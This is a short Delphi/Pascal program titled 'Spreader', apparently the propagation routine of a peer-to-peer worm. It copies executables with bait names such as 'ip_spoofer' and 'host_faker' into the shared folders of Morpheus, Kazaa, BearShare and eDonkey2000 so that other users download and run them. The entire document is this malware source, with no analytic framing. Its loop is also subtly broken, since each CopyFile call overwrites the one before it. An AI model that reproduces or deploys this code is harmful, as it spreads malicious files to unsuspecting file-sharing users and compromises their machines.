   program Spreader;

   uses
     windows;

   var
     i: integer;

   const
     NAME: array [1..5] of string = ('host_faker','host_spoofer','ip_spoofer','ip_faker','ident_spoofer');

   begin
      for i:=1 to 5 do begin
       CopyFile(PChar('ident_spoofer.exe'),PChar('c:\program files\morpheus\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_faker.exe'),PChar('c:\program files\morpheus\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_spoofer.exe'),PChar('c:\program files\morpheus\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_spoofer.exe'),PChar('c:\program files\morpheus\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_faker.exe'),PChar('c:\program files\morpheus\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ident_spoofer.exe'),PChar('c:\program files\kazaa\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_faker.exe'),PChar('c:\program files\kazaa\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_spoofer.exe'),PChar('c:\program files\kazaa\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_spoofer.exe'),PChar('c:\program files\kazaa\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_faker.exe'),PChar('c:\program files\kazaa\my shared folder\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ident_spoofer.exe'),PChar('c:\program files\bearshare\shared\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_faker.exe'),PChar('c:\program files\bearshare\shared\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_spoofer.exe'),PChar('c:\program files\bearshare\shared\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_spoofer.exe'),PChar('c:\program files\bearshare\shared\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_faker.exe'),PChar('c:\program files\bearshare\shared\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ident_spoofer.exe'),PChar('c:\program files\eDonkey2000\incoming\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_faker.exe'),PChar('c:\program files\eDonkey2000\incoming\'+Name[i]+'.exe'),false);
       CopyFile(PChar('ip_spoofer.exe'),PChar('c:\program files\eDonkey2000\incoming\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_spoofer.exe'),PChar('c:\program files\eDonkey2000\incoming\'+Name[i]+'.exe'),false);
       CopyFile(PChar('host_faker.exe'),PChar('c:\program files\eDonkey2000\incoming\'+Name[i]+'.exe'),false);
     end;
   end.
